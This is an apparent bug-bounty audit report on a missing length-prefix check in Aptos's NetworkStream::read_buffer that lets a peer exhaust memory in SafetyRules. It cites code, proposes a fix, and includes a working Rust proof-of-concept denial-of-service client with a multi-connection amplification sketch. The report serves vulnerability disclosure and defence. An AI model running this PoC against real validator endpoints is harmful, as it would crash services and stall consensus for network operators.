# Audit Report

## Title
Memory Exhaustion via Unbounded Buffer Growth in NetworkStream Due to Missing Length Prefix Validation

## Summary
The `NetworkStream::read_buffer()` function in `secure/net/src/lib.rs` lacks validation of the length prefix received from untrusted network peers. An attacker can send a malicious length prefix indicating gigabytes of data, causing unbounded buffer growth and memory exhaustion in critical services like SafetyRules, leading to consensus liveness failures.

## Finding Description

The `NetworkStream` implementation uses a length-prefixed protocol where a 4-byte little-endian `u32` indicates the message size. [1](#0-0) 

The length prefix is read and converted to `usize` without any validation against a maximum message size. [2](#0-1) 

When insufficient data is available, the function returns an empty vector, causing the `read()` function to continue reading from the socket. [3](#0-2) 

The buffer accumulates data indefinitely via `extend()` calls until the declared size is reached. [4](#0-3) 

While the write side validates that outgoing messages don't exceed `u32::MAX`, [5](#0-4)  the read side accepts any length prefix value, including values up to 4GB.

In contrast, the main Aptos network framework enforces `MAX_MESSAGE_SIZE = 64 * 1024 * 1024` (64 MiB). [6](#0-5) 

**Attack Scenario:**
1. Attacker connects to a service using `NetworkServer` (e.g., SafetyRules remote service) [7](#0-6) 
2. Sends a malicious 4-byte length prefix: `[0xFF, 0xFF, 0xFF, 0x7F]` = 2,147,483,647 bytes (2 GB)
3. Sends data at a rate that avoids the read timeout (e.g., 1 KB per second with 5-second timeout)
4. The buffer grows unboundedly, attempting to accumulate 2 GB
5. With multiple concurrent connections, memory exhaustion occurs rapidly
6. The service (e.g., SafetyRules) crashes or becomes unresponsive

The remnant mechanism at line 494 can also be exploited: [8](#0-7)  An attacker can craft messages that leave 4 bytes of remnant data containing a malicious length prefix, which is then interpreted on the next read cycle.

## Impact Explanation

**HIGH SEVERITY** - This vulnerability meets the Aptos bug bounty criteria for High Severity issues:

1. **Validator Node Slowdowns/Crashes**: Memory exhaustion causes the SafetyRules service to become unresponsive or crash
2. **Consensus Liveness Failure**: SafetyRules is critical for signing consensus votes. If a validator's SafetyRules service is unavailable, that validator cannot participate in consensus
3. **Network-Wide Impact**: Multiple validators targeted simultaneously results in network-wide liveness degradation or halt
4. **API Crashes**: Other services using `NetworkServer` (network controllers, remote executors) are similarly vulnerable

The vulnerability breaks **Critical Invariant #9**: "Resource Limits: All operations must respect gas, storage, and computational limits." The network stream buffer can grow to gigabytes without any bounds checking.

## Likelihood Explanation

**HIGH LIKELIHOOD** - This vulnerability is highly likely to be exploited:

1. **Easy to Execute**: The attack requires only basic network programming knowledge - connecting to a TCP socket and sending crafted bytes
2. **No Authentication Required**: An attacker can connect to any exposed `NetworkServer` endpoint
3. **Deterministic Impact**: The attack reliably causes memory growth; success depends only on sending data fast enough to avoid timeout
4. **Amplification**: Opening multiple concurrent connections multiplies the memory exhaustion rate
5. **Observable Targets**: SafetyRules and other services expose network endpoints that can be discovered

## Recommendation

Add maximum message size validation in `NetworkStream::read_buffer()`, consistent with the main network framework's limits:

```rust
fn read_buffer(&mut self) -> Vec<u8> {
    if self.buffer.len() < 4 {
        return Vec::new();
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;

    // Add validation against maximum message size
    const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; // 64 MiB
    if data_size > MAX_MESSAGE_SIZE {
        // Log the violation and reset the buffer to prevent attacks
        return Vec::new();
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Vec::new();
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    returnable_data
}
```

Additionally, modify the `Error` enum to include a new error type for oversized messages and return this error instead of silently dropping the data, allowing proper error handling at higher layers.

## Proof of Concept

```rust
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;
use std::thread;

fn main() {
    // Target a SafetyRules service or any NetworkServer endpoint
    let target = "127.0.0.1:6191"; // Example SafetyRules port
    
    println!("[*] Connecting to {}", target);
    let mut stream = TcpStream::connect(target).expect("Failed to connect");
    stream.set_write_timeout(Some(Duration::from_secs(30))).unwrap();
    
    // Send malicious length prefix: 2 GB
    let malicious_length: u32 = 2_147_483_647; // 2^31 - 1 bytes
    let length_bytes = malicious_length.to_le_bytes();
    
    println!("[*] Sending malicious length prefix: {} bytes", malicious_length);
    stream.write_all(&length_bytes).expect("Failed to write length");
    
    // Send data slowly to keep connection alive but cause unbounded buffer growth
    let chunk = vec![0u8; 1024]; // 1 KB chunks
    println!("[*] Sending data chunks to cause buffer accumulation...");
    
    for i in 0..1000 {
        stream.write_all(&chunk).expect("Failed to write chunk");
        println!("[*] Sent chunk {} (Total: {} KB)", i, (i + 1));
        thread::sleep(Duration::from_millis(100));
        
        // The server's buffer is growing by 1KB every 100ms
        // After 1000 iterations = 1 MB accumulated
        // An attacker can continue until memory exhaustion
    }
    
    println!("[*] Attack complete. Target should show memory growth.");
}

// To test with multiple connections:
// for _ in 0..100 {
//     thread::spawn(|| attack_target("127.0.0.1:6191"));
// }
// With 100 connections each declaring 2GB, the target attempts to allocate 200GB
```

**Notes:**
- This PoC demonstrates unbounded buffer growth in the target service
- The buffer continues growing until either memory exhaustion or the attacker stops sending data
- Multiple concurrent connections amplify the attack exponentially
- The lack of validation makes this attack trivial to execute

### Citations

**File:** secure/net/src/lib.rs (L443-443)
```rust
            self.buffer.extend(self.temp_buffer[..read].to_vec());
```

**File:** secure/net/src/lib.rs (L460-463)
```rust
        let u32_max = u32::MAX as usize;
        if u32_max <= data.len() {
            return Err(Error::DataTooLarge(data.len()));
        }
```

**File:** secure/net/src/lib.rs (L484-486)
```rust
        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;
```

**File:** secure/net/src/lib.rs (L488-491)
```rust
        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }
```

**File:** secure/net/src/lib.rs (L494-494)
```rust
        self.buffer = remaining_data[data_size..].to_vec();
```

**File:** network/framework/src/constants.rs (L21-21)
```rust
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```

**File:** consensus/safety-rules/src/remote_service.rs (L37-38)
```rust
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);
```
